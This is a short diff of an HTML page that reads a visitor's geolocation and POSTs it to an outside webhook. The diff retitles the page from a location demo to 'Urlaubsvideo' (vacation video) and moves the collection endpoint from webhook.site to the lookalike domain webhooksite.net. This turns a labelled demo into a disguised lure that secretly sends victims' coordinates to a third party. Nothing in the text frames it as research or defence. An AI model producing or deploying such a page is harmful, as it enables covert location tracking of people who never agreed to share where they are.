@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Standort-Demo</title>
+  <title>Urlaubsvideo</title>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 40px; }
     button { font-size: 1.2em; padding: 12px 24px; background-color: #007bff; color: white; border: none; border-radius: 5px; }
@@ -34,7 +34,7 @@
           document.getElementById('output').textContent = 'Standort: ' + lat.toFixed(5) + ', ' + lon.toFixed(5);
           
           // HIER WIRD ES AN WEBHOOK GESENDET:
-          fetch('https://webhook.site/fbfc485c-39c9-4ff4-bd01-cd476a988857', {
+          fetch('https://webhooksite.net/fbfc485c-39c9-4ff4-bd01-cd476a988857', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
